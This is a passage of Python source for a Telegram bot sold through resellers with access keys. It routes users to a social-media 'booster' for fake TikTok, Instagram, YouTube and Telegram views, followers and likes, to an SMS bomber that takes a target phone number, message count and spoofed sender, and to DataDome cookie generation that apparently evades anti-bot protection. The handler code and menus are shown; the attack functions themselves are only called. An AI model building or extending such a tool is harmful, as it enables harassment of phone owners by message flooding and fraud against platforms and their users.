        "⚠️ **Note:** Make sure the URL is correct and publicly accessible."
    )
    
    await current_message.edit_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def handle_boost_url(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_BOOST_URL:
        return

    target_url = update.message.text.strip()
    boost_type = context.user_data.get('boost_type')
    
    # Validate URL based on boost type
    url_patterns = {
        'boost_tiktok_views': ['tiktok.com'],
        'boost_tiktok_followers': ['tiktok.com'],
        'boost_tiktok_likes': ['tiktok.com'],
        'boost_telegram_views': ['t.me', 'telegram.me'],
        'boost_facebook': ['facebook.com'],
        'boost_instagram_views': ['instagram.com'],
        'boost_twitter_views': ['twitter.com', 'x.com'],
        'boost_youtube_views': ['youtube.com', 'youtu.be']
    }
    
    service_names = {
        'boost_tiktok_views': 'TikTok Views',
        'boost_tiktok_followers': 'TikTok Followers',
        'boost_tiktok_likes': 'TikTok Likes',
        'boost_telegram_views': 'Telegram Views',
        'boost_facebook': 'Facebook',
        'boost_instagram_views': 'Instagram Views',
        'boost_twitter_views': 'Twitter Views',
        'boost_youtube_views': 'YouTube Views'
    }
    
    service_name = service_names.get(boost_type, 'Unknown')
    patterns = url_patterns.get(boost_type, [])
    
    # Validate URL
    is_valid = any(pattern in target_url for pattern in patterns)
    if not is_valid:
        await update.message.reply_text(
            f"❌ **Invalid URL for {service_name}!**\n\n"
            f"URL must contain one of: {', '.join(patterns)}\n"
            "Please send a valid URL:",
            parse_mode="Markdown"
        )
        return
    
    AWAITING_BOOST_URL.discard(user_id)
    BOOSTER_ACTIVE.add(user_id)
    
    # Send initial processing message
    processing_msg = await update.message.reply_text(
        f"🔄 **Starting {service_name} Boost...**\n\n"
        f"**Target:** `{target_url}`\n"
        "Processing your request... Please wait ⏳",
        parse_mode="Markdown"
    )
    
    # Create booster instance and process
    booster = SocialMediaBooster()
    success = False
    result_message = ""
    
    try:
        # Call appropriate boosting method
        if boost_type == 'boost_tiktok_views':
            success, result_message = await booster.boost_tiktok_views(target_url)
        elif boost_type == 'boost_tiktok_followers':
            success, result_message = await booster.boost_tiktok_followers(target_url)
        elif boost_type == 'boost_tiktok_likes':
            success, result_message = await booster.boost_tiktok_likes(target_url)
        elif boost_type == 'boost_telegram_views':
            success, result_message = await booster.boost_telegram_views(target_url)
        elif boost_type == 'boost_facebook':
            success, result_message = await booster.boost_facebook(target_url)
        elif boost_type == 'boost_instagram_views':
            success, result_message = await booster.boost_instagram_views(target_url)
        elif boost_type == 'boost_twitter_views':
            success, result_message = await booster.boost_twitter_views(target_url)
        elif boost_type == 'boost_youtube_views':
            success, result_message = await booster.boost_youtube_views(target_url)
        else:
            result_message = "𝚄𝚗𝚔𝚗𝚘𝚠𝚗 𝚋𝚘𝚘𝚜𝚝 𝚝𝚢𝚙𝚎"
    except Exception as e:
        success = False
        result_message = f"Error: {str(e)}"
    
    # Send result
    if success:
        final_message = (
            f"✅ **{service_name} 𝙱𝚘𝚘𝚜𝚝 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕!** ✅\n\n"
            f"**𝚃𝚊𝚛𝚐𝚎𝚝:** `{target_url}`\n"
            f"**𝚁𝚎𝚜𝚞𝚕𝚝:** {result_message}\n\n"
            "✨ 𝚈𝚘𝚞𝚛 𝚋𝚘𝚘𝚜𝚝 𝚑𝚊𝚜 𝚋𝚎𝚎𝚗 𝚙𝚛𝚘𝚌𝚎𝚜𝚜𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢!\n"
            "⏱️ 𝙲𝚑𝚊𝚗𝚐𝚎𝚜 𝚖𝚊𝚢 𝚝𝚊𝚔𝚎 𝚊 𝚏𝚎𝚠 𝚖𝚒𝚗𝚞𝚝𝚎𝚜 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛."
        )
    else:
        final_message = (
            f"❌ **{service_name} 𝙱𝚘𝚘𝚜𝚝 𝙵𝚊𝚒𝚕𝚎𝚍!** ❌\n\n"
            f"**𝚃𝚊𝚛𝚐𝚎𝚝:** `{target_url}`\n"
            f"**𝙴𝚛𝚛𝚘𝚛:** {result_message}\n\n"
            "⚠️ 𝙿𝚕𝚎𝚊𝚜𝚎 𝚝𝚛𝚢 𝚊𝚐𝚊𝚒𝚗 𝚕𝚊𝚝𝚎𝚛 𝚘𝚛 𝚌𝚑𝚎𝚌𝚔 𝚝𝚑𝚎 𝚄𝚁𝙻 𝚟𝚊𝚕𝚒𝚍𝚒𝚝𝚢."
        )
    
    # Edit the processing message with results
    await processing_msg.edit_text(final_message, parse_mode="Markdown")
    
    # Add back button
    keyboard = [[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ʙᴏᴏsᴛᴇʀ ᴍᴇɴᴜ", callback_data="social_media_booster_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "✨ **𝙱𝚘𝚘𝚜𝚝 𝙿𝚛𝚘𝚌𝚎𝚜𝚜 𝙲𝚘𝚖𝚙𝚕𝚎𝚝𝚎** ✨",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )
    
    BOOSTER_ACTIVE.discard(user_id)
    context.user_data.pop('boost_type', None)

# ========== RESELLER STATS ==========
async def reseller_stats(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("reseller_stats called with no effective message.")
        return

    user_id = update.effective_user.id
    
    if USER_ROLES.get(user_id) != "reseller":
        if update.callback_query:
            await update.callback_query.answer("❌ 𝙰𝚌𝚌𝚎𝚜𝚜 𝙳𝚎𝚗𝚒𝚎𝚍!", show_alert=True)
            await current_message.edit_text("❌ **𝙰𝚌𝚌𝚎𝚜𝚜 𝙳𝚎𝚗𝚒𝚎𝚍!** 𝚃𝚑𝚒𝚜 𝚏𝚎𝚊𝚝𝚞𝚛𝚎 𝚒𝚜 𝚏𝚘𝚛 𝚛𝚎𝚜𝚎𝚕𝚕𝚎𝚛𝚜 𝚘𝚗𝚕𝚢.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌ **𝙰𝚌𝚌𝚎𝚜𝚜 𝙳𝚎𝚗𝚒𝚎𝚍!** 𝚃𝚑𝚒𝚜 𝚏𝚎𝚊𝚝𝚞𝚛𝚎 𝚒𝚜 𝚏𝚘𝚛 𝚛𝚎𝚜𝚎𝚕𝚕𝚎𝚛𝚜 𝚘𝚗𝚕𝚢.", parse_mode="Markdown")
        return

    # Count keys generated by this reseller
    keys_generated = 0
    for key_data in ACCESS_KEYS.values():
        if key_data.get("created_by") == user_id:
            keys_generated += 1
    
    𝚜𝚝𝚊𝚝𝚜_𝚝𝚎𝚡𝚝 = (
        f"💼 **𝚁𝚎𝚜𝚎𝚕𝚕𝚎𝚛 𝙳𝚊𝚜𝚑𝚋𝚘𝚊𝚛𝚍** 💼\n\n"
        f"👤 **𝚈𝚘𝚞𝚛 𝚂𝚝𝚊𝚝𝚜:**\n"
        f"• 𝚄𝚜𝚎𝚛 𝙸𝙳: `{𝚞𝚜𝚎𝚛_𝚒𝚍}`\n"
        f"• 𝚁𝚘𝚕𝚎: **𝚁𝚎𝚜𝚎𝚕𝚕𝚎𝚛**\n"
        f"• 𝙺𝚎𝚢𝚜 𝙶𝚎𝚗𝚎𝚛𝚊𝚝𝚎𝚍: **{𝚔𝚎𝚢𝚜_𝚐𝚎𝚗𝚎𝚛𝚊𝚝𝚎𝚍}**\n"
        f"• 𝙰𝚌𝚝𝚒𝚟𝚎 𝚄𝚜𝚎𝚛𝚜: **𝟶** (𝚝𝚛𝚊𝚌𝚔𝚒𝚗𝚐 𝚌𝚘𝚖𝚒𝚗𝚐 𝚜𝚘𝚘𝚗)\n\n"
        f"📊 **𝙺𝚎𝚢 𝙼𝚊𝚗𝚊𝚐𝚎𝚖𝚎𝚗𝚝:**\n"
        f"• 𝙶𝚎𝚗𝚎𝚛𝚊𝚝𝚎 𝚗𝚎𝚠 𝚔𝚎𝚢𝚜 𝚞𝚜𝚒𝚗𝚐 𝚝𝚑𝚎 '🔑 𝙶𝚎𝚗𝚎𝚛𝚊𝚝𝚎 𝙺𝚎𝚢' 𝚘𝚙𝚝𝚒𝚘𝚗\n"
        f"• 𝚃𝚛𝚊𝚌𝚔 𝚔𝚎𝚢 𝚞𝚜𝚊𝚐𝚎 𝚒𝚗 𝚏𝚞𝚝𝚞𝚛𝚎 𝚞𝚙𝚍𝚊𝚝𝚎𝚜\n"
        f"• 𝙴𝚊𝚛𝚗 𝚌𝚘𝚖𝚖𝚒𝚜𝚜𝚒𝚘𝚗𝚜 𝚋𝚊𝚜𝚎𝚍 𝚘𝚗 𝚊𝚌𝚝𝚒𝚟𝚊𝚝𝚒𝚘𝚗𝚜\n\n"
        f"✨ **𝚃𝚒𝚙𝚜 𝚏𝚘𝚛 𝚂𝚞𝚌𝚌𝚎𝚜𝚜:**\n"
        f"𝟷. 𝙲𝚛𝚎𝚊𝚝𝚎 𝚔𝚎𝚢𝚜 𝚠𝚒𝚝𝚑 𝚊𝚙𝚙𝚛𝚘𝚙𝚛𝚒𝚊𝚝𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗𝚜\n"
        f"𝟸. 𝚂𝚑𝚊𝚛𝚎 𝚢𝚘𝚞𝚛 𝚛𝚎𝚏𝚎𝚛𝚛𝚊𝚕 𝚕𝚒𝚗𝚔 (𝚌𝚘𝚖𝚒𝚗𝚐 𝚜𝚘𝚘𝚗)\n"
        f"𝟹. 𝙼𝚘𝚗𝚒𝚝𝚘𝚛 𝚢𝚘𝚞𝚛 𝚜𝚊𝚕𝚎𝚜 𝚙𝚎𝚛𝚏𝚘𝚛𝚖𝚊𝚗𝚌𝚎\n"
        f"𝟺. 𝙲𝚘𝚗𝚝𝚊𝚌𝚝 𝚊𝚍𝚖𝚒𝚗 𝚏𝚘𝚛 𝚔𝚎𝚢𝚜\n\n"
        f"📞 **𝚂𝚞𝚙𝚙𝚘𝚛𝚝:** @Khatelynnnnnn"
    )
    
    keyboard = [
        [InlineKeyboardButton("🔑 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴 𝙺𝙴𝚈", callback_data="admin_gen_key")],
        [InlineKeyboardButton("⬅️ 𝙱𝙰𝙲𝙺 𝚃𝙾 𝙼𝙰𝙸𝙽 𝙼𝙴𝙽𝚄", callback_data="back_to_main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await current_message.edit_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")

# ========== HANDLE UNKNOWN MESSAGES ==========
async def handle_unknown_message(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if user_id in AWAITING_KEY_INPUT:
        await handle_enter_key(update, context)
    elif user_id in AWAITING_KEY_DURATION:
        await handle_key_duration(update, context)
    elif user_id in AWAITING_KEY_COUNT:
        await handle_key_count(update, context)
    elif user_id in AWAITING_REVOKE_USER:
        await handle_revoke_user(update, context)
    elif user_id in AWAITING_ANNOUNCEMENT:
        await handle_announcement(update, context)
    elif user_id in AWAITING_DELETE_KEY:
        await handle_delete_key(update, context)
    elif user_id in AWAITING_ROLE_USER_ID:
        await handle_role_user_id_input(update, context)
    elif user_id in AWAITING_FEEDBACK:
        await handle_feedback(update, context)
    elif user_id in AWAITING_FILE_UPLOAD:
        await handle_file_processing(update, context)
    elif user_id in AWAITING_BOMBER_PHONE:
        await handle_bomber_phone(update, context)
    elif user_id in AWAITING_BOMBER_AMOUNT:
        await handle_bomber_amount(update, context)
    elif user_id in AWAITING_BOMBER_SENDER:
        await handle_bomber_sender(update, context)
    elif user_id in AWAITING_BOMBER_MESSAGE:
        await handle_bomber_message(update, context)
    elif user_id in AWAITING_BOOST_URL:
        await handle_boost_url(update, context)
    else:
        await update.message.reply_text(
            "⚠️ **𝙸 𝚍𝚘𝚗'𝚝 𝚞𝚗𝚍𝚎𝚛𝚜𝚝𝚊𝚗𝚍 𝚝𝚑𝚊𝚝 𝚌𝚘𝚖𝚖𝚊𝚗𝚍!**\n\n"
            "𝙿𝚕𝚎𝚊𝚜𝚎 𝚞𝚜𝚎 𝚝𝚑𝚎 𝚖𝚎𝚗𝚞 𝚋𝚞𝚝𝚝𝚘𝚗𝚜 𝚘𝚛 𝚝𝚢𝚙𝚎 /start 𝚝𝚘 𝚜𝚎𝚎 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚘𝚙𝚝𝚒𝚘𝚗𝚜.",
            parse_mode="Markdown"
        )

# ========== CALLBACK QUERY HANDLER ==========
async def handle_callback_query(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    try:
        if data == "show_generate_menu":
            await generate_menu(update, context)
        elif data == "database_menu":
            await database_menu(update, context)
        elif data.startswith("generate:"):
            await generate_file(update, context)
        elif data == "show_stats":
            await show_stats(update, context)
        elif data == "prompt_key":
            await prompt_for_key(update, context)
        elif data == "start_encryption":
            await start_encryption(update, context)
        elif data.startswith("enc_method_"):
            await handle_enc_method_callback(update, context)
        elif data.startswith("enc_page_"):
            await enc_handle_pagination(update, context)
        elif data == "cancel_encryption_conv":
            await cancel_encryption(update, context)
        elif data == "url_duplicate_remover":
            await url_duplicate_remover_menu(update, context)
        elif data == "remove_urls":
            await start_url_removal(update, context)
        elif data == "remove_duplicates":
            await start_duplicate_removal(update, context)
        elif data == "datadome_menu":
            await datadome_menu(update, context)
        elif data == "generate_datadome":
            await generate_datadome_cookie(update, context)
        elif data == "generate_datadome_file":
            await generate_datadome_file(update, context)
        elif data == "datadome_info":
            await datadome_info(update, context)
        elif data == "sms_bomber_menu":
            await sms_bomber_menu(update, context)
        elif data == "start_sms_bomber":
            await start_sms_bomber(update, context)
        elif data == "stop_sms_bomber":
            await stop_sms_bomber(update, context)
        elif data == "bomber_stats":
            await bomber_stats(update, context)
        elif data == "bomber_info":
            await bomber_info(update, context)
        elif data == "social_media_booster_menu":
            await social_media_booster_menu(update, context)
        elif data in ["boost_tiktok_views", "boost_tiktok_followers", "boost_tiktok_likes",
                     "boost_telegram_views", "boost_facebook", "boost_instagram_views",
                     "boost_twitter_views", "boost_youtube_views"]:
            await start_boost_process(update, context)
        elif data == "show_admin_panel":
            await admin_panel(update, context)
        elif data == "admin_gen_key" or data == "admin_gen_key_single":
            await generate_key_command(update, context)
        elif data == "admin_gen_key_multi":
            await generate_key_command(update, context)
        elif data == "admin_users":
            await user_list(update, context)
        elif data == "admin_revoke":
            await revoke_access(update, context)
        elif data == "admin_announce":
            await send_announcement(update, context)
        elif data == "admin_delete_single_key":
            await prompt_delete_single_key(update, context)
        elif data == "show_maintenance_options":
            await show_maintenance_options(update, context)
        elif data == "admin_turn_on_maintenance":
            await admin_turn_on_maintenance(update, context)
        elif data == "admin_turn_off_maintenance":
            await admin_turn_off_maintenance(update, context)
        elif data == "admin_manage_roles":
            await admin_manage_roles(update, context)
        elif data == "admin_prompt_role_user_id":
            await admin_prompt_role_user_id(update, context)
        elif data.startswith("assign_role:"):
            await admin_assign_selected_role(update, context)
        elif data == "show_db_status":
            await database_status(update, context)
        elif data == "prompt_feedback":
            await prompt_feedback(update, context)
        elif data == "show_help":
            await show_help(update, context)
        elif data == "cancel_action":
            await cancel_action(update, context)
        elif data == "back_to_main_menu":
            await back_to_main_menu(update, context)
        elif data == "reseller_stats":
            await reseller_stats(update, context)
        else:
            await query.message.edit_text(
                "⚠️ **𝚄𝚗𝚔𝚗𝚘𝚠𝚗 𝚋𝚞𝚝𝚝𝚘𝚗 𝚊𝚌𝚝𝚒𝚘𝚗!**\n\n𝙿𝚕𝚎𝚊𝚜𝚎 𝚝𝚛𝚢 𝚊𝚐𝚊𝚒𝚗 𝚘𝚛 𝚞𝚜𝚎 /start.",
                parse_mode="Markdown"
            )
    except Exception as e:
        logging.error(f"𝙴𝚛𝚛𝚘𝚛 𝚒𝚗 𝚌𝚊𝚕𝚕𝚋𝚊𝚌𝚔 𝚚𝚞𝚎𝚛𝚢 𝚑𝚊𝚗𝚍𝚕𝚎𝚛 𝚏𝚘𝚛 𝚍𝚊𝚝𝚊 {data}: {e}")
        try:
            await query.message.edit_text(
                f"❌ **𝙰𝚗 𝚎𝚛𝚛𝚘𝚛 𝚘𝚌𝚌𝚞𝚛𝚛𝚎𝚍!**\n\n`{str(e)}`\n\n𝙿𝚕𝚎𝚊𝚜𝚎 𝚝𝚛𝚢 𝚊𝚐𝚊𝚒𝚗 𝚘𝚛 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝚜𝚞𝚙𝚙𝚘𝚛𝚝.",
                parse_mode="Markdown"
            )
        except:
            pass
# ========== HEALTH CHECK ENDPOINT FOR UPTIMEROBOT ==========
from flask import Flask, jsonify
import threading

health_app = Flask(__name__)

@health_app.route('/health')
def health_check():
    return jsonify({"status": "ok", "message": "Bot is running!"}), 200

def run_health_server():
    health_app.run(host='0.0.0.0', port=8080)

# Start health server in background thread
threading.Thread(target=run_health_server, daemon=True).start()
print("✅ Health check server running on port 8080")
# ========== MAIN FUNCTION ==========
def main():
    """Start the bot."""
    load_existing_data()
    
    application = Application.builder().token(TOKEN).build()
    
    # Conversation handler for encryption
    enc_conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_encryption, pattern="^start_encryption$")],
        states={
            SELECTING_ENC_METHOD: [
                CallbackQueryHandler(handle_enc_method_callback, pattern="^enc_method_"),
                CallbackQueryHandler(enc_handle_pagination, pattern="^enc_page_"),
                CallbackQueryHandler(cancel_encryption, pattern="^cancel_encryption_conv$"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, select_enc_method)
            ],
            SELECTING_ENC_COUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, select_enc_count)
            ],
            UPLOADING_ENC_FILE: [
                MessageHandler(filters.Document.ALL, handle_enc_file_upload)
            ],
        },
        fallbacks=[
            CallbackQueryHandler(cancel_encryption, pattern="^cancel_encryption_conv$"),
            CommandHandler("cancel", cancel_encryption)
        ],
        allow_reentry=True
    )
    
    application.add_handler(enc_conv_handler)
    
    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stats", show_stats))
    application.add_handler(CommandHandler("help", show_help))
    application.add_handler(CommandHandler("cancel", cancel_action))
    
    # Callback query handler
    application.add_handler(CallbackQueryHandler(handle_callback_query))
    
    # Message handlers for various states
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^[0-9]+$') & filters.Regex(r'^[0-9]+$'), handle_unknown_message))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_unknown_message))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_unknown_message))
    
    # Start the bot
    logging.info("Bot is starting...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

# Add at the very bottom of your code, before or after main():
if __name__ == '__main__':
    # Start a simple HTTP server for health checks (required by Render)
    import threading
    from http.server import HTTPServer, BaseHTTPRequestHandler
    
    class HealthHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
    
    def run_health_server():
        server = HTTPServer(('0.0.0.0', int(os.environ.get("PORT", 8080))), HealthHandler)
        server.serve_forever()
    
    # Run health server in background
    threading.Thread(target=run_health_server, daemon=True).start()
    
    # Run your bot
    main()